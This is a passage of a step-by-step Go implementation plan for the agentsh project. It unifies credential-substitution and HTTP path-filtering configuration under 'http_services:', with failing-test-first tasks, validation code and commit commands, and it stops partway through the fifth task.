# Unified HTTP Services Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Merge the `services:` (credential substitution) and `http_services:` (path/verb filtering) YAML sections into a single unified `http_services:` declaration, remove the Host-based `services.Matcher`, add a differentiated `secret_cross_service_use` audit event, and update operator documentation.

**Architecture:** Extend `HTTPService` with optional `Secret`, `Inject`, `ScrubResponse` fields. Merge `ValidateSecrets` into `ValidateHTTPServices`. Update the bootstrap path (`ResolveServiceConfigs` → `StartLLMProxy` → `app.go`) to read from `http_services:` instead of `services:`. Delete `secrets.go`, `services/matcher.go`, and the `SetMatcher` proxy method. Add cross-service audit event differentiation in `LeakGuardHook`.

**Tech Stack:** Go 1.25, `gopkg.in/yaml.v3`, `github.com/gobwas/glob`, `crypto/rand`

**Design spec:** `docs/superpowers/specs/2026-04-12-unified-http-services-design.md`

---

## File Structure

| Action | Path | Responsibility |
|--------|------|----------------|
| Modify | `internal/policy/http_service.go` | Add `HTTPServiceSecret`, `HTTPServiceInject`, `HTTPServiceInjectHeader` types; add credential validation to `ValidateHTTPServices`; move `knownProviderTypes` here |
| Modify | `internal/policy/http_service_test.go` | Add credential validation tests, old-key rejection test, default-defaulting tests |
| Modify | `internal/policy/http_service_compile.go` | Handle `default` defaulting for credentials-only services |
| Modify | `internal/policy/model.go` | Remove `Services []ServiceYAML`; replace with `Services yaml.Node` tripwire; remove `ValidateSecrets` call from `Validate()` |
| Delete | `internal/policy/secrets.go` | Old `ServiceYAML` types and `ValidateSecrets` — replaced by unified model |
| Delete | `internal/policy/secrets_test.go` | Tests for deleted types |
| Modify | `internal/session/secretsconfig.go` | Change `ResolveServiceConfigs` to accept `[]policy.HTTPService`; remove `Patterns` output; remove `services` import |
| Modify | `internal/session/secretsconfig_test.go` | Update tests for new input type |
| Modify | `internal/session/llmproxy.go` | Change `StartLLMProxy` signature; remove matcher construction; remove `services` import |
| Modify | `internal/api/app.go` | Pass `policy.HTTPServices` instead of `policy.Services` |
| Delete | `internal/proxy/services/matcher.go` | Host-based `Matcher` — no longer needed |
| Delete | `internal/proxy/services/matcher_test.go` | Matcher tests |
| Modify | `internal/proxy/proxy.go` | Remove `matcher` field, `SetMatcher` method, `services` import |
| Modify | `internal/proxy/credshook.go` | Add `logCrossService` method; branch in `LeakGuardHook.PreHook` |
| Modify | `internal/proxy/credshook_test.go` | Add cross-service audit event tests |
| Modify | `docs/cookbook/http-services.md` | Add credential substitution explainer and recipes |
| Modify | `docs/llm-proxy.md` | Update "Declared HTTP Services" reference with `secret:`, `inject:`, `scrub_response:` |

---

### Task 1: Add Credential Types to HTTPService

**Files:**
- Modify: `internal/policy/http_service.go:18-26`
- Modify: `internal/policy/http_service_test.go`

- [ ] **Step 1: Write the failing test**

Add to `internal/policy/http_service_test.go`:

```go
func TestHTTPServiceYAMLUnmarshal_WithSecret(t *testing.T) {
	input := `
http_services:
  - name: github
    upstream: https://api.github.com
    default: deny
    secret:
      ref: "vault://kv/data/github#token"
      format: "ghp_{rand:36}"
    inject:
      header:
        name: Authorization
        template: "Bearer {{secret}}"
    scrub_response: true
    rules:
      - name: read-issues
        methods: [GET]
        paths: ["/repos/*/*/issues"]
        decision: allow
`
	var p struct {
		HTTPServices []policy.HTTPService `yaml:"http_services"`
	}
	if err := yaml.Unmarshal([]byte(input), &p); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if len(p.HTTPServices) != 1 {
		t.Fatalf("want 1 service, got %d", len(p.HTTPServices))
	}
	s := p.HTTPServices[0]
	if s.Secret == nil {
		t.Fatal("secret is nil")
	}
	if s.Secret.Ref != "vault://kv/data/github#token" {
		t.Errorf("secret.ref = %q", s.Secret.Ref)
	}
	if s.Secret.Format != "ghp_{rand:36}" {
		t.Errorf("secret.format = %q", s.Secret.Format)
	}
	if s.Inject == nil || s.Inject.Header == nil {
		t.Fatal("inject.header is nil")
	}
	if s.Inject.Header.Name != "Authorization" {
		t.Errorf("inject.header.name = %q", s.Inject.Header.Name)
	}
	if s.Inject.Header.Template != "Bearer {{secret}}" {
		t.Errorf("inject.header.template = %q", s.Inject.Header.Template)
	}
	if s.ScrubResponse == nil || !*s.ScrubResponse {
		t.Error("scrub_response should be true")
	}
}

func TestHTTPServiceYAMLUnmarshal_WithoutSecret(t *testing.T) {
	input := `
http_services:
  - name: stripe
    upstream: https://api.stripe.com
    default: deny
    rules:
      - name: read
        methods: [GET]
        paths: ["/v1/customers"]
        decision: allow
`
	var p struct {
		HTTPServices []policy.HTTPService `yaml:"http_services"`
	}
	if err := yaml.Unmarshal([]byte(input), &p); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	s := p.HTTPServices[0]
	if s.Secret != nil {
		t.Error("secret should be nil for filtering-only service")
	}
	if s.Inject != nil {
		t.Error("inject should be nil for filtering-only service")
	}
	if s.ScrubResponse != nil {
		t.Error("scrub_response should be nil when not set")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/policy/ -run TestHTTPServiceYAMLUnmarshal_With -v -count=1`
Expected: FAIL — `s.Secret` field does not exist on `HTTPService`.

- [ ] **Step 3: Add the types to `internal/policy/http_service.go`**

Add after the `Rules` field on the `HTTPService` struct (line 25):

```go
type HTTPService struct {
	Name        string            `yaml:"name"`
	Upstream    string            `yaml:"upstream"`               // https://api.github.com
	ExposeAs    string            `yaml:"expose_as,omitempty"`    // env var name; derived from Name if empty
	Aliases     []string          `yaml:"aliases,omitempty"`      // extra hostnames for the fail-closed check
	AllowDirect bool              `yaml:"allow_direct,omitempty"` // escape hatch; default false
	Default     string            `yaml:"default,omitempty"`      // allow | deny; default depends on Rules presence
	Rules       []HTTPServiceRule `yaml:"rules,omitempty"`

	// Credential substitution (unified from old services: section).
	Secret        *HTTPServiceSecret `yaml:"secret,omitempty"`
	Inject        *HTTPServiceInject `yaml:"inject,omitempty"`
	ScrubResponse *bool              `yaml:"scrub_response,omitempty"` // nil = default based on Secret presence
}

// HTTPServiceSecret defines how to fetch and fake a credential.
type HTTPServiceSecret struct {
	Ref    string `yaml:"ref"`    // e.g. "vault://kv/data/github#token"
	Format string `yaml:"format"` // e.g. "ghp_{rand:36}"
}

// HTTPServiceInject defines how the credential is injected into requests.
type HTTPServiceInject struct {
	Header *HTTPServiceInjectHeader `yaml:"header,omitempty"`
}

// HTTPServiceInjectHeader defines header injection config.
type HTTPServiceInjectHeader struct {
	Name     string `yaml:"name"`     // e.g. "Authorization"
	Template string `yaml:"template"` // e.g. "Bearer {{secret}}"
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/policy/ -run TestHTTPServiceYAMLUnmarshal_With -v -count=1`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/policy/http_service.go internal/policy/http_service_test.go
git commit -m "feat(policy): add credential types to HTTPService struct"
```

---

### Task 2: Add Credential Validation to ValidateHTTPServices

**Files:**
- Modify: `internal/policy/http_service.go:142-237` (ValidateHTTPServices)
- Modify: `internal/policy/http_service_test.go`

- [ ] **Step 1: Write the failing tests**

Add to `internal/policy/http_service_test.go`:

```go
func TestValidateHTTPServices_SecretAndRules(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name:     "github",
		Upstream: "https://api.github.com",
		Default:  "deny",
		Secret:   &policy.HTTPServiceSecret{Ref: "keyring://agentsh/github_token", Format: "ghp_{rand:36}"},
		Inject:   &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Authorization", Template: "Bearer {{secret}}"}},
		Rules: []policy.HTTPServiceRule{{
			Name: "read", Methods: []string{"GET"}, Paths: []string{"/repos/**"}, Decision: "allow",
		}},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	if err := policy.ValidateHTTPServicesWithProviders(svcs, providers); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateHTTPServices_SecretOnly(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name:     "anthropic",
		Upstream: "https://api.anthropic.com",
		Secret:   &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "sk-ant-{rand:93}"},
		Inject:   &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "x-api-key", Template: "{{secret}}"}},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	if err := policy.ValidateHTTPServicesWithProviders(svcs, providers); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateHTTPServices_RulesOnly(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "stripe", Upstream: "https://api.stripe.com", Default: "deny",
		Rules: []policy.HTTPServiceRule{{
			Name: "read", Methods: []string{"GET"}, Paths: []string{"/v1/customers"}, Decision: "allow",
		}},
	}}
	if err := policy.ValidateHTTPServicesWithProviders(svcs, nil); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestValidateHTTPServices_NoSecretNoRules(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "empty", Upstream: "https://api.example.com",
	}}
	err := policy.ValidateHTTPServicesWithProviders(svcs, nil)
	if err == nil || !strings.Contains(err.Error(), "has no secret and no rules") {
		t.Fatalf("want 'no secret and no rules' error, got: %v", err)
	}
}

func TestValidateHTTPServices_InjectWithoutSecret(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com", Default: "deny",
		Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Auth", Template: "{{secret}}"}},
		Rules:  []policy.HTTPServiceRule{{Name: "r", Paths: []string{"/**"}, Decision: "allow"}},
	}}
	err := policy.ValidateHTTPServicesWithProviders(svcs, nil)
	if err == nil || !strings.Contains(err.Error(), "inject requires secret") {
		t.Fatalf("want 'inject requires secret' error, got: %v", err)
	}
}

func TestValidateHTTPServices_InvalidSecretRef(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "not-a-valid-ref", Format: "sk-{rand:40}"},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "invalid secret ref") {
		t.Fatalf("want 'invalid secret ref' error, got: %v", err)
	}
}

func TestValidateHTTPServices_SecretRefUndeclaredProvider(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "vault://kv/data/key#token", Format: "ghp_{rand:36}"},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "no matching provider") {
		t.Fatalf("want 'no matching provider' error, got: %v", err)
	}
}

func TestValidateHTTPServices_InvalidFakeFormat(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "short{rand:5}"},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "invalid fake format") {
		t.Fatalf("want 'invalid fake format' error, got: %v", err)
	}
}

func TestValidateHTTPServices_MissingSecretPlaceholder(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "ghp_{rand:36}"},
		Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Auth", Template: "Bearer MISSING"}},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "must contain {{secret}}") {
		t.Fatalf("want 'must contain {{secret}}' error, got: %v", err)
	}
}

// mustYAMLNode is a test helper that creates a yaml.Node from a string.
func mustYAMLNode(t *testing.T, s string) yaml.Node {
	t.Helper()
	var n yaml.Node
	if err := yaml.Unmarshal([]byte(s), &n); err != nil {
		t.Fatalf("mustYAMLNode: %v", err)
	}
	// yaml.Unmarshal wraps in a document node; return the first content node.
	if n.Kind == yaml.DocumentNode && len(n.Content) > 0 {
		return *n.Content[0]
	}
	return n
}

func TestValidateHTTPServices_InjectNoHeader_Rejected(t *testing.T) {
	// inject is set but has no header → useless config, reject.
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "ghp_{rand:36}"},
		Inject: &policy.HTTPServiceInject{}, // no Header
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "inject.header is required") {
		t.Fatalf("want 'inject.header is required' error, got: %v", err)
	}
}

func TestValidateHTTPServices_InjectHeaderNameEmpty_Rejected(t *testing.T) {
	svcs := []policy.HTTPService{{
		Name: "bad", Upstream: "https://api.example.com",
		Secret: &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "ghp_{rand:36}"},
		Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "", Template: "{{secret}}"}},
	}}
	providers := map[string]yaml.Node{"keyring": mustYAMLNode(t, "type: keyring")}
	err := policy.ValidateHTTPServicesWithProviders(svcs, providers)
	if err == nil || !strings.Contains(err.Error(), "header name is required") {
		t.Fatalf("want 'header name is required' error, got: %v", err)
	}
}

func TestValidateHTTPServices_MultipleServicesMultipleProviders(t *testing.T) {
	svcs := []policy.HTTPService{
		{
			Name: "github", Upstream: "https://api.github.com",
			Secret: &policy.HTTPServiceSecret{Ref: "vault://kv/data/github#token", Format: "ghp_{rand:36}"},
			Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Authorization", Template: "Bearer {{secret}}"}},
		},
		{
			Name: "anthropic", Upstream: "https://api.anthropic.com",
			Secret: &policy.HTTPServiceSecret{Ref: "keyring://agentsh/anthropic_key", Format: "sk-ant-{rand:93}"},
			Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "x-api-key", Template: "{{secret}}"}},
		},
	}
	providers := map[string]yaml.Node{
		"vault":   mustYAMLNode(t, "type: vault\naddress: https://vault.example.com"),
		"keyring": mustYAMLNode(t, "type: keyring"),
	}
	if err := policy.ValidateHTTPServicesWithProviders(svcs, providers); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
}

func TestPolicyValidate_ProvidersNoHTTPServices(t *testing.T) {
	// Policy with providers but no http_services should load fine.
	input := `
version: 1
providers:
  keyring:
    type: keyring
`
	var p policy.Policy
	if err := yaml.Unmarshal([]byte(input), &p); err != nil {
		t.Fatalf("unmarshal: %v", err)
	}
	if err := p.Validate(); err != nil {
		t.Fatalf("expected no error for providers-only policy, got: %v", err)
	}
}

func TestValidateHTTPServices_SecretRefWithFragment(t *testing.T) {
	// Verify that secret.ref with a #fragment (e.g. vault://kv/data/github#token)
	// parses correctly.
	svcs := []policy.HTTPService{{
		Name: "github", Upstream: "https://api.github.com",
		Secret: &policy.HTTPServiceSecret{Ref: "vault://kv/data/github#token", Format: "ghp_{rand:36}"},
		Inject: &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Authorization", Template: "Bearer {{secret}}"}},
	}}
	providers := map[string]yaml.Node{
		"vault": mustYAMLNode(t, "type: vault\naddress: https://vault.example.com"),
	}
	if err := policy.ValidateHTTPServicesWithProviders(svcs, providers); err != nil {
		t.Fatalf("secret.ref with fragment should be valid, got: %v", err)
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/policy/ -run "TestValidateHTTPServices_(SecretAnd|SecretOnly|RulesOnly|NoSecret|InjectWithout|InvalidSecret|SecretRef|InvalidFake|MissingSecret)" -v -count=1`
Expected: FAIL — `ValidateHTTPServicesWithProviders` does not exist.

- [ ] **Step 3: Add credential validation**

In `internal/policy/http_service.go`, add the new imports:

```go
import (
	"fmt"
	"net/netip"
	"net/url"
	"regexp"
	"strings"

	"github.com/agentsh/agentsh/internal/proxy/secrets"
	"github.com/agentsh/agentsh/internal/proxy/secrets/fakegen"
	"github.com/gobwas/glob"
)
```

Add `knownProviderTypes` (moved from secrets.go):

```go
// knownProviderTypes lists the provider type names (URI schemes) that
// are supported. Extended as new providers land.
var knownProviderTypes = map[string]bool{
	"keyring":  true,
	"vault":    true,
	"aws-sm":   true,
	"gcp-sm":   true,
	"azure-kv": true,
	"op":       true,
}
```

Add the new validation function that wraps the existing one with provider context:

```go
// ValidateHTTPServicesWithProviders validates http_services including
// credential fields that cross-reference providers. Called from
// Policy.Validate where the Providers map is available.
func ValidateHTTPServicesWithProviders(svcs []HTTPService, providers map[string]yaml.Node) error {
	// Run structural validation first (names, upstream, rules, env vars).
	if err := ValidateHTTPServices(svcs); err != nil {
		return err
	}

	// Build provider scheme set for cross-referencing.
	providerSchemes := make(map[string]bool)
	for _, node := range providers {
		var base struct{ Type string `yaml:"type"` }
		if err := node.Decode(&base); err == nil && base.Type != "" {
			providerSchemes[base.Type] = true
		}
	}

	for _, s := range svcs {
		// At least one of secret or rules must be present.
		if s.Secret == nil && len(s.Rules) == 0 {
			return fmt.Errorf("http_services[%q]: service has no secret and no rules", s.Name)
		}
		// inject requires secret.
		if s.Inject != nil && s.Secret == nil {
			return fmt.Errorf("http_services[%q]: inject requires secret", s.Name)
		}

		if s.Secret != nil {
			ref, err := secrets.ParseRef(s.Secret.Ref)
			if err != nil {
				return fmt.Errorf("http_services[%q]: invalid secret ref: %w", s.Name, err)
			}
			if len(providerSchemes) > 0 && !providerSchemes[ref.Scheme] {
				return fmt.Errorf("http_services[%q]: secret ref scheme %q has no matching provider", s.Name, ref.Scheme)
			}
			if len(providerSchemes) == 0 {
				return fmt.Errorf("http_services[%q]: secret ref scheme %q has no matching provider (no providers declared)", s.Name, ref.Scheme)
			}
			if _, _, err := fakegen.ParseFormat(s.Secret.Format); err != nil {
				return fmt.Errorf("http_services[%q]: invalid fake format: %w", s.Name, err)
			}
		}

		if s.Inject != nil && s.Inject.Header != nil {
			if !strings.Contains(s.Inject.Header.Template, "{{secret}}") {
				return fmt.Errorf("http_services[%q]: inject.header.template must contain {{secret}}", s.Name)
			}
			if strings.TrimSpace(s.Inject.Header.Name) == "" {
				return fmt.Errorf("http_services[%q]: inject.header name is required", s.Name)
			}
		}
		if s.Inject != nil && s.Inject.Header == nil {
			return fmt.Errorf("http_services[%q]: inject.header is required when inject is set", s.Name)
		}
	}
	return nil
}
```

Note: the import paths for `secrets` and `fakegen` are:
- `"github.com/agentsh/agentsh/internal/proxy/secrets"`
- `"github.com/agentsh/agentsh/internal/proxy/secrets/fakegen"`

Check the actual import paths in the codebase (they might use a different module path). Look at `internal/policy/secrets.go` line 9-10 for the correct import path.

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/policy/ -run "TestValidateHTTPServices_(SecretAnd|SecretOnly|RulesOnly|NoSecret|InjectWithout|InvalidSecret|SecretRef|InvalidFake|MissingSecret)" -v -count=1`
Expected: PASS

- [ ] **Step 5: Run all existing policy tests to check for regressions**

Run: `go test ./internal/policy/... -count=1`
Expected: PASS — no existing tests broken.

- [ ] **Step 6: Commit**

```bash
git add internal/policy/http_service.go internal/policy/http_service_test.go
git commit -m "feat(policy): add credential validation to ValidateHTTPServices"
```

---

### Task 3: Update Default Defaulting in Compiler

**Files:**
- Modify: `internal/policy/http_service_compile.go:49-51`
- Modify: `internal/policy/http_service_test.go`

- [ ] **Step 1: Write the failing tests**

Add to `internal/policy/http_service_test.go`. These tests exercise `CheckHTTPService` which reads from the compiled `defaultDecision`, so they test the compile path indirectly:

```go
func TestCheckHTTPService_CredentialsOnlyDefaultAllow(t *testing.T) {
	// Service with secret but no rules and no explicit default.
	// Should default to "allow" (credentials-only forwarding).
	pol := &policy.Policy{
		Version: 1,
		HTTPServices: []policy.HTTPService{{
			Name:     "anthropic",
			Upstream: "https://api.anthropic.com",
			// No Default set, no Rules — credentials-only.
			Secret: &policy.HTTPServiceSecret{
				Ref:    "keyring://agentsh/key",
				Format: "sk-ant-{rand:93}",
			},
		}},
	}
	engine, err := policy.NewEngine(pol)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	dec := engine.CheckHTTPService("anthropic", "POST", "/v1/messages")
	if dec.EffectiveDecision != "allow" {
		t.Errorf("want allow for credentials-only, got %q", dec.EffectiveDecision)
	}
}

func TestCheckHTTPService_RulesDefaultDeny(t *testing.T) {
	// Service with rules but no explicit default.
	// Should default to "deny" (fail-closed).
	pol := &policy.Policy{
		Version: 1,
		HTTPServices: []policy.HTTPService{{
			Name:     "stripe",
			Upstream: "https://api.stripe.com",
			// No Default set, has Rules.
			Rules: []policy.HTTPServiceRule{{
				Name: "read", Methods: []string{"GET"}, Paths: []string{"/v1/customers"}, Decision: "allow",
			}},
		}},
	}
	engine, err := policy.NewEngine(pol)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	dec := engine.CheckHTTPService("stripe", "DELETE", "/v1/customers/123")
	if dec.EffectiveDecision != "deny" {
		t.Errorf("want deny for unmatched request with rules, got %q", dec.EffectiveDecision)
	}
}

func TestCheckHTTPService_ExplicitDenyOnCredentialsOnly(t *testing.T) {
	// Service with secret, no rules, but explicit default: deny.
	// Should honor the explicit deny (emergency lockdown).
	pol := &policy.Policy{
		Version: 1,
		HTTPServices: []policy.HTTPService{{
			Name:     "locked",
			Upstream: "https://api.example.com",
			Default:  "deny",
			Secret: &policy.HTTPServiceSecret{
				Ref:    "keyring://agentsh/key",
				Format: "ghp_{rand:36}",
			},
		}},
	}
	engine, err := policy.NewEngine(pol)
	if err != nil {
		t.Fatalf("NewEngine: %v", err)
	}
	dec := engine.CheckHTTPService("locked", "GET", "/anything")
	if dec.EffectiveDecision != "deny" {
		t.Errorf("want deny for explicit lockdown, got %q", dec.EffectiveDecision)
	}
}
```

- [ ] **Step 2: Run tests to verify the credentials-only test fails**

Run: `go test ./internal/policy/ -run "TestCheckHTTPService_(CredentialsOnly|RulesDefault|ExplicitDeny)" -v -count=1`
Expected: `TestCheckHTTPService_CredentialsOnlyDefaultAllow` FAILS — currently defaults to "deny" when empty.

- [ ] **Step 3: Update `compileHTTPServices` in `internal/policy/http_service_compile.go`**

Replace the default-decision logic at lines 49-52:

```go
		defDec := s.Default
		if defDec == "" {
			if len(s.Rules) == 0 {
				defDec = "allow" // credentials-only: forwarding is the point
			} else {
				defDec = "deny" // has rules: fail-closed
			}
		}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/policy/ -run "TestCheckHTTPService_(CredentialsOnly|RulesDefault|ExplicitDeny)" -v -count=1`
Expected: PASS

- [ ] **Step 5: Run all policy tests for regressions**

Run: `go test ./internal/policy/... -count=1`
Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add internal/policy/http_service_compile.go internal/policy/http_service_test.go
git commit -m "feat(policy): default to allow for credentials-only http_services"
```

---

### Task 4: Update ResolveServiceConfigs

**Files:**
- Modify: `internal/session/secretsconfig.go:34-103`
- Modify: `internal/session/secretsconfig_test.go`

- [ ] **Step 1: Write the failing tests**

Add to `internal/session/secretsconfig_test.go`. **Note:** the existing tests `TestResolveServiceConfigs`, `TestResolveServiceConfigs_InjectEnv`, and `TestResolveServiceConfigs_ScrubResponse` use the deleted `policy.ServiceYAML` type. Delete those tests and replace with the new ones below.

```go
func TestResolveServiceConfigs_FromHTTPService(t *testing.T) {
	scrubTrue := true
	svcs := []policy.HTTPService{
		{
			Name:     "github",
			Upstream: "https://api.github.com",
			Secret:   &policy.HTTPServiceSecret{Ref: "keyring://agentsh/github_token", Format: "ghp_{rand:36}"},
			Inject:   &policy.HTTPServiceInject{Header: &policy.HTTPServiceInjectHeader{Name: "Authorization", Template: "Bearer {{secret}}"}},
			ScrubResponse: &scrubTrue,
		},
		{
			Name:     "stripe",
			Upstream: "https://api.stripe.com",
			Default:  "deny",
			Rules:    []policy.HTTPServiceRule{{Name: "r", Paths: []string{"/**"}, Decision: "allow"}},
			// No secret — filtering-only.
		},
	}
	resolved, err := session.ResolveServiceConfigs(svcs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	// Only github has a secret; stripe should be skipped.
	if len(resolved.ServiceConfigs) != 1 {
		t.Fatalf("want 1 ServiceConfig, got %d", len(resolved.ServiceConfigs))
	}
	if resolved.ServiceConfigs[0].Name != "github" {
		t.Errorf("want github, got %q", resolved.ServiceConfigs[0].Name)
	}
	if len(resolved.InjectHeaders) != 1 {
		t.Fatalf("want 1 InjectHeader, got %d", len(resolved.InjectHeaders))
	}
	if resolved.InjectHeaders[0].HeaderName != "Authorization" {
		t.Errorf("want Authorization, got %q", resolved.InjectHeaders[0].HeaderName)
	}
	if !resolved.ScrubServices["github"] {
		t.Error("github should have scrub_response=true")
	}
}

func TestResolveServiceConfigs_EmptyList(t *testing.T) {
	resolved, err := session.ResolveServiceConfigs(nil)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if resolved != nil {
		t.Error("nil input should return nil")
	}
}

func TestResolveServiceConfigs_ScrubResponseDefault(t *testing.T) {
	// Secret present, no explicit scrub_response → should default to true.
	svcs := []policy.HTTPService{{
		Name:     "svc",
		Upstream: "https://api.example.com",
		Secret:   &policy.HTTPServiceSecret{Ref: "keyring://agentsh/key", Format: "ghp_{rand:36}"},
	}}
	resolved, err := session.ResolveServiceConfigs(svcs)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if !resolved.ScrubServices["svc"] {
		t.Error("secret present with no explicit scrub_response should default to true")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/session/ -run "TestResolveServiceConfigs_From" -v -count=1`
Expected: FAIL — `ResolveServiceConfigs` takes `[]policy.ServiceYAML`, not `[]policy.HTTPService`.

- [ ] **Step 3: Update `ResolveServiceConfigs` in `internal/session/secretsconfig.go`**

Replace the `ResolvedServices` struct and `ResolveServiceConfigs` function:

```go
// ResolvedServices holds the parsed outputs needed by the bootstrap flow.
type ResolvedServices struct {
	ServiceConfigs []ServiceConfig
	InjectHeaders  []InjectHeaderConfig
	ScrubServices  map[string]bool // service name -> scrub_response flag
}

// ResolveServiceConfigs converts unified HTTPService declarations into
// ServiceConfigs for BootstrapCredentials plus InjectHeaderConfigs for
// hook registration. Only services with Secret != nil are included.
func ResolveServiceConfigs(svcs []policy.HTTPService) (*ResolvedServices, error) {
	if len(svcs) == 0 {
		return nil, nil
	}

	// Filter to services with credentials.
	var hasSecret bool
	for _, svc := range svcs {
		if svc.Secret != nil {
			hasSecret = true
			break
		}
	}
	if !hasSecret {
		return nil, nil
	}

	result := &ResolvedServices{
		ScrubServices: make(map[string]bool),
	}
	for _, svc := range svcs {
		if svc.Secret == nil {
			continue
		}
		ref, err := secrets.ParseRef(svc.Secret.Ref)
		if err != nil {
			return nil, fmt.Errorf("service %q: %w", svc.Name, err)
		}
		result.ServiceConfigs = append(result.ServiceConfigs, ServiceConfig{
			Name:       svc.Name,
			SecretRef:  ref,
			FakeFormat: svc.Secret.Format,
		})
		if svc.Inject != nil && svc.Inject.Header != nil {
			result.InjectHeaders = append(result.InjectHeaders, InjectHeaderConfig{
				ServiceName: svc.Name,
				HeaderName:  svc.Inject.Header.Name,
				Template:    svc.Inject.Header.Template,
			})
		}
		// Resolve scrub_response default.
		if svc.ScrubResponse != nil {
			result.ScrubServices[svc.Name] = *svc.ScrubResponse
		} else {
			result.ScrubServices[svc.Name] = true // default true when secret present
		}
	}
	return result, nil
}
```

Remove the `"github.com/agentsh/agentsh/internal/proxy/services"` import and the `ServiceEnvVar` type (no longer needed — env vars are handled by `Proxy.EnvVars()`).

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/session/ -run "TestResolveServiceConfigs" -v -count=1`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/session/secretsconfig.go internal/session/secretsconfig_test.go
git commit -m "refactor(session): ResolveServiceConfigs accepts []policy.HTTPService"
```

---

### Task 5: Update StartLLMProxy, app.go, and Policy.Validate (Atomic Swap)

This task atomically swaps the caller chain from `Services` to `HTTPServices`. All three files must change together to keep the build passing.

**Files:**
- Modify: `internal/session/llmproxy.go:25-178`
- Modify: `internal/api/app.go:470-488`
- Modify: `internal/policy/model.go:46-55,517-525`

- [ ] **Step 1: Update `StartLLMProxy` signature and body**

In `internal/session/llmproxy.go`, change the parameter from `policyServices []policy.ServiceYAML` to `httpServices []policy.HTTPService`:

```go
func StartLLMProxy(
	sess *Session,
	proxyCfg config.ProxyConfig,
	dlpCfg config.DLPConfig,
	storageCfg config.LLMStorageConfig,
	mcpCfg config.SandboxMCPConfig,
	storagePath string,
	logger *slog.Logger,
	providers map[string]yaml.Node,
	httpServices []policy.HTTPService,
	envInject map[string]string,
) (string, func() error, error) {
```

Update the credential bootstrap block (around line 106). Change:

```go
	if len(policyServices) > 0 {
		resolved, resolveErr := ResolveServiceConfigs(policyServices)
```

To:

```go
	if len(httpServices) > 0 {
		resolved, resolveErr := ResolveServiceConfigs(httpServices)
```

Remove the matcher construction and SetMatcher call (lines 160-162):

```go
		// DELETE these lines:
		// matcher := services.NewMatcher(resolved.Patterns)
